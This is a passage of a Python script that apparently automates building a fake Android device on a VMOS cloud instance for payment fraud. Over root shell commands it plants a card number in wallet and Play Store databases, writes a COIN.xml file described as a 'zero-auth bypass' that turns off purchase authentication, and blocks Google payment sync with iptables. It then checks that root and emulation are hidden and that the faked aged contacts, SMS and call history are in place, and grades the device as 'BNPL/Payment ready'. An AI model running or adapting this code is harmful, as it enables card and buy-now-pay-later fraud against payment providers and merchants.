    await asyncio.sleep(CMD_DELAY)
    await sh(f"chown {wallet_uid}:{wallet_uid} {wallet_db_path}/tapandpay.db && chmod 660 {wallet_db_path}/tapandpay.db && rm -f {wallet_db_path}/tapandpay.db-wal {wallet_db_path}/tapandpay.db-shm", "tpay_perms")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Push library.db ───
    print("  [5] Pushing library.db...")
    lib_path = "/data/data/com.android.vending/databases"
    await sh(f"mkdir -p {lib_path}", "lib_dir")
    await asyncio.sleep(CMD_DELAY)
    
    await push_file(library_bytes, f"{lib_path}/library.db", "library")
    await asyncio.sleep(CMD_DELAY)
    
    vend_uid = (await sh("stat -c %u /data/data/com.android.vending", "uid")).strip() or "10038"
    await asyncio.sleep(CMD_DELAY)
    await sh(f"chown {vend_uid}:{vend_uid} {lib_path}/library.db && chmod 660 {lib_path}/library.db", "lib_perms")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── COIN.xml (8-flag zero-auth bypass) ───
    print("  [6] Writing COIN.xml (8-flag zero-auth)...")
    funding_id = str(uuid.uuid4())
    last4 = CARD_NUMBER[-4:]
    auth_token = secrets.token_hex(32)
    
    coin_xml = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="has_payment_method" value="true" />
    <string name="payment_method_type">CREDIT_CARD</string>
    <string name="default_instrument_id">{funding_id}</string>
    <string name="instrument_last_four">{last4}</string>
    <string name="instrument_brand">VISA</string>
    <boolean name="purchase_requires_auth" value="false" />
    <boolean name="require_purchase_auth" value="false" />
    <string name="auth_token">{auth_token}</string>
    <boolean name="one_touch_enabled" value="true" />
    <boolean name="biometric_payment_enabled" value="true" />
    <boolean name="PAYMENTS_ZERO_AUTH_ENABLED" value="true" />
    <boolean name="device_auth_not_required" value="true" />
    <boolean name="skip_challenge_on_payment" value="true" />
    <boolean name="frictionless_checkout_enabled" value="true" />
    <string name="account_name">{EMAIL}</string>
    <boolean name="tos_accepted" value="true" />
    <long name="last_sync_time" value="{int(time.time() * 1000)}" />
</map>"""
    
    coin_path = "/data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml"
    await sh(f"cat > {coin_path} << 'COINEOF'\n{coin_xml}\nCOINEOF", "coin")
    await asyncio.sleep(CMD_DELAY)
    await sh(f"chown {vend_uid}:{vend_uid} {coin_path}", "coin_perms")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── GMS wallet prefs ───
    print("  [7] Writing GMS wallet prefs...")
    wallet_prefs = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="wallet_setup_complete" value="true" />
    <string name="wallet_account">{EMAIL}</string>
    <string name="default_instrument_id">{funding_id}</string>
    <long name="last_sync_timestamp" value="{int(time.time() * 1000)}" />
    <boolean name="nfc_payment_enabled" value="true" />
    <string name="wallet_environment">PRODUCTION</string>
</map>"""
    
    payment_prefs = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="payment_methods_synced" value="true" />
    <string name="profile_email">{EMAIL}</string>
    <long name="last_sync_time" value="{int(time.time() * 1000)}" />
    <boolean name="has_billing_address" value="true" />
    <string name="payment_profile_id">{str(uuid.uuid4())}</string>
</map>"""
    
    gms_prefs = "/data/data/com.google.android.gms/shared_prefs"
    await sh(f"cat > {gms_prefs}/wallet_instrument_prefs.xml << 'WEOF'\n{wallet_prefs}\nWEOF", "wallet_prefs")
    await asyncio.sleep(CMD_DELAY)
    await sh(f"cat > {gms_prefs}/payment_profile_prefs.xml << 'PPEOF'\n{payment_prefs}\nPPEOF", "payment_prefs")
    await asyncio.sleep(CMD_DELAY)
    
    gms_uid = (await sh("stat -c %u /data/data/com.google.android.gms", "uid")).strip() or "10036"
    await asyncio.sleep(CMD_DELAY)
    await sh(f"chown -R {gms_uid}:{gms_uid} {gms_prefs}", "gms_perms")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── NFC config ───
    print("  [8] Configuring NFC...")
    await sh("settings put secure nfc_on 1 && settings put secure nfc_payment_foreground 1", "nfc")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Cloud sync defeat ───
    print("  [9] Blocking cloud sync (iptables)...")
    await sh(f"""vuid=$(stat -c %u /data/data/com.android.vending)
iptables -I OUTPUT -m owner --uid-owner $vuid -j DROP 2>/dev/null
muid=$(stat -c %u /data/data/com.google.android.gms)
iptables -I OUTPUT -p tcp --dport 443 -m owner --uid-owner $muid -m string --string "payments.google.com" --algo bm -j DROP 2>/dev/null
cmd appops set com.android.vending RUN_IN_BACKGROUND deny 2>/dev/null
cmd appops set com.android.vending RUN_ANY_IN_BACKGROUND deny 2>/dev/null
echo SYNC_BLOCKED""", "sync_block")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── SELinux restore ───
    await sh(f"restorecon -R /data/data/{wallet_pkg} /data/data/com.android.vending /data/data/com.google.android.gms", "restorecon")
    await asyncio.sleep(CMD_DELAY)
    
    print(f"\n  Wallet injection complete. Funding ID: {funding_id}")
    return funding_id


# ═══ PHASE 8: FINAL VALIDATION ══════════════════════════════════════
async def phase8_validate():
    print("\n" + "=" * 70)
    print("PHASE 8: FINAL VALIDATION")
    print("=" * 70)
    
    checks = []
    
    # Account
    out = await sh("dumpsys account 2>/dev/null | grep -c 'com.google' || echo 0", "chk_acct")
    acct_ok = int(out.strip() or "0") > 0
    checks.append(("Google Account", acct_ok))
    await asyncio.sleep(CMD_DELAY)
    
    # Contacts
    out = await sh("content query --uri content://com.android.contacts/raw_contacts --projection _id 2>/dev/null | grep -c '_id=' || echo 0", "chk_contacts")
    contacts = int(out.strip() or "0")
    checks.append(("Contacts (50+)", contacts >= 40))
    await asyncio.sleep(CMD_DELAY)
    
    # SMS
    out = await sh("content query --uri content://sms --projection _id 2>/dev/null | grep -c '_id=' || echo 0", "chk_sms")
    sms = int(out.strip() or "0")
    checks.append(("SMS (80+)", sms >= 60))
    await asyncio.sleep(CMD_DELAY)
    
    # Calls
    out = await sh("content query --uri content://call_log/calls --projection _id 2>/dev/null | grep -c '_id=' || echo 0", "chk_calls")
    calls = int(out.strip() or "0")
    checks.append(("Call logs (60+)", calls >= 40))
    await asyncio.sleep(CMD_DELAY)
    
    # WiFi
    out = await sh("ls /data/misc/wifi/WifiConfigStore.xml 2>/dev/null && echo YES || echo NO", "chk_wifi")
    checks.append(("WiFi networks", "YES" in out))
    await asyncio.sleep(CMD_DELAY)
    
    # tapandpay
    out = await sh("ls /data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null && echo YES || ls /data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db 2>/dev/null && echo YES || echo NO", "chk_tpay")
    checks.append(("tapandpay.db", "YES" in out))
    await asyncio.sleep(CMD_DELAY)
    
    # COIN.xml
    out = await sh("ls /data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml 2>/dev/null && echo YES || echo NO", "chk_coin")
    checks.append(("COIN.xml", "YES" in out))
    await asyncio.sleep(CMD_DELAY)
    
    # NFC
    out = await sh("settings get secure nfc_on", "chk_nfc")
    checks.append(("NFC enabled", out.strip() == "1"))
    await asyncio.sleep(CMD_DELAY)
    
    # Stealth
    out = await sh("getprop ro.boot.verifiedbootstate", "chk_vboot")
    checks.append(("Verified boot (green)", out.strip() == "green"))
    await asyncio.sleep(CMD_DELAY)
    
    out = await sh("getprop ro.build.type", "chk_build")
    checks.append(("Build type (user)", out.strip() == "user"))
    await asyncio.sleep(CMD_DELAY)
    
    out = await sh("cat /proc/cmdline | grep -ci vmos", "chk_cmdline")
    checks.append(("Proc cmdline clean", out.strip() == "0"))
    await asyncio.sleep(CMD_DELAY)
    
    out = await sh("which su 2>/dev/null && echo FOUND || echo HIDDEN", "chk_su")
    checks.append(("su hidden", "HIDDEN" in out))
    await asyncio.sleep(CMD_DELAY)
    
    # Gallery
    out = await sh("ls /sdcard/DCIM/Camera/*.jpg 2>/dev/null | wc -l || echo 0", "chk_gallery")
    photos = int(out.strip() or "0")
    checks.append(("Gallery photos (20+)", photos >= 10))
    
    # Print results
    passed = sum(1 for _, ok in checks if ok)
    total = len(checks)
    
    print(f"\n  VALIDATION RESULTS: {passed}/{total}")
    print("  " + "-" * 50)
    for name, ok in checks:
        print(f"  {'✓' if ok else '✗'} {name}")
    
    score = int(passed / total * 100)
    print(f"\n  TRUST SCORE: {score}/100")
    if score >= 85:
        print("  GRADE: A — BNPL/Payment ready")
    elif score >= 70:
        print("  GRADE: B — Most apps will accept")
    elif score >= 50:
        print("  GRADE: C — Basic apps only")
    else:
        print("  GRADE: F — Needs more work")
    
    return score


# ═══ MAIN ORCHESTRATOR ══════════════════════════════════════════════
async def main():
    global client
    client = VMOSCloudClient()
    
    start_time = time.time()
    
    # Phase 1: Discover device
    if not await phase1_discover():
        print("\nABORT: Device not available")
        return
    
    # Phase 2: Initial scan
    android_id = await phase2_scan()
    if not android_id:
        android_id = secrets.token_hex(8)
    print(f"\n  Android ID: {android_id}")
    
    # Phase 3: Anomaly patching + stealth
    await phase3_anomaly_patch()
    
    # Phase 4: Account injection (with safe VMOS API restart)
    gaia_id, gsf_id = await phase4_account_inject(android_id)
    
    # Phase 5: Re-apply stealth (lost during restart)
    await phase5_reapply_stealth()
    
    # Phase 6: Data injection + 180-day aging
    await phase6_data_aging()
    
    # Phase 7: Wallet injection
    funding_id = await phase7_wallet_inject(gaia_id, gsf_id)
    
    # Phase 8: Final validation
    score = await phase8_validate()
    
    elapsed = time.time() - start_time
    print(f"\n{'=' * 70}")
    print(f"GENESIS PIPELINE COMPLETE")
    print(f"  Device: {PAD}")
    print(f"  Email: {EMAIL}")
    print(f"  Card: ****{CARD_NUMBER[-4:]}")
    print(f"  Age: {AGE_DAYS} days")
    print(f"  Score: {score}/100")
    print(f"  Time: {elapsed/60:.1f} min")
    print(f"{'=' * 70}")

asyncio.run(main())
